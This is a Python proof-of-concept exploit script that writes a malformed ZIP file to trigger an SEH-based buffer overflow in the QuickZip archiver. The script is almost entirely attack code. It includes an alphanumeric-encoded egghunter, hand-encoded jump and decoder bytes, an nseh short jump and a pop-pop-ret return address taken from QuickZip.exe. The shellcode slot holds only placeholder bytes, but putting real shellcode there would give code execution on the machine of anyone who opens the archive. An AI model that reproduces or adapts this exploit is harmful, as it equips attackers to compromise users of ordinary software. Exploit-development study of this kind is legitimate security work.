#!/usr/bin/python

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

print "[+] Building PoC.."

shellcode = "B00BB00B" + "\x41" * 1000

# 118 bytes
# cat egghunter-B00B.bin |msfvenom -a x86 --platform windows -e x86/alpha_mixed BufferRegister=EBX -f c
egghunter = ("\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x30\x66\x6e\x61\x5a\x6a\x6b\x4f"
"\x56\x6f\x47\x32\x52\x72\x32\x4a\x66\x62\x32\x78\x6a\x6d\x76"
"\x4e\x35\x6c\x37\x75\x52\x7a\x53\x44\x48\x6f\x6e\x58\x31\x52"
"\x44\x70\x64\x70\x57\x32\x4c\x4b\x4b\x4a\x6c\x6f\x54\x35\x69"
"\x7a\x4c\x6f\x71\x65\x68\x67\x39\x6f\x39\x77\x41\x41")

# PUT address of encoded egghunter into EBX
# 0012FB52   55               PUSH EBP
# 0012FB53   58               POP EAX
# 0012FB54   05 61454141      ADD EAX,41414561
# 0012FB59   2D 21414141      SUB EAX,41414121
# 0012FB5E   50               PUSH EAX
# 0012FB5F   5B               POP EBX
# 0012FB60   FFE3             JMP EBX   <== Non alpha-num, so we'll have to encode/decode it

# Align ESP to decode JMP EBX 
# 0012FB8C   54               PUSH ESP
# 0012FB8D   58               POP EAX
# 0012FB8E   05 57474141      ADD EAX,41414757
# 0012FB93   2D 21414141      SUB EAX,41414121
# 0012FB98   50               PUSH EAX
# 0012FB99   5C               POP ESP

# decode JMP EBX
# "\x25\x4a\x4d\x4e\x55"  # AND EAX,0x554E4D4A
# "\x25\x35\x32\x31\x2a"  # AND EAX,0x2A313235
# "\x2d\x10\x1e\x10\x10"  # SUB EAX,0x10101e10
# "\x2d\x73\x7e\x11\x12"  # SUB EAX,0x12117e73
# "\x2d\x7e\x7f\x4d\x4d"  # SUB EAX,0x4d4d7f7e
# "\x50"                  # PUSH EAX


jmpcode = ("\x55"
           "\x58"
           "\x05\x61\x45\x41\x41"
           "\x2d\x21\x41\x41\x41"
           "\x50"
           "\x5B"
           "\x54"
           "\x58"
           "\x05\x57\x47\x41\x41"
           "\x2d\x21\x41\x41\x41"
           "\x50"
           "\x5C"
           "\x25\x4a\x4d\x4e\x55"
           "\x25\x35\x32\x31\x2a"
           "\x2d\x10\x1e\x10\x10"
           "\x2d\x73\x7e\x11\x12"
           "\x2d\x7e\x7f\x4d\x4d"
           "\x50")

nops = "\x41" * (70 -len(jmpcode))

max_size = 4064

junk1 = "A" * (292 -len(egghunter) -len(jmpcode) -len(nops))

# conditional backward jump (ZF=1) of 92bytes (\xff gets converted into \xa0) 
nseh = "\x74\xff\x41\x41"

# 0x00422833 : pop ecx # pop ebp # ret 0x04 | [QuickZip.exe]
seh = "\x33\x28\x42\x00"
payload = egghunter + junk1 + jmpcode + nops + nseh + seh + shellcode + "C" * (max_size -len(egghunter) -len(junk1) -len(jmpcode) -len(nops) -len(nseh) -len(seh) -len(shellcode))
payload += ".txt"

print "[+] Length = " + str(len(payload))

exploit = header_1 + payload + header_2 + payload + header_3

mefile = open('crash.zip','w');
mefile.write(exploit);
mefile.close()

print "[+] Exploit complete!"

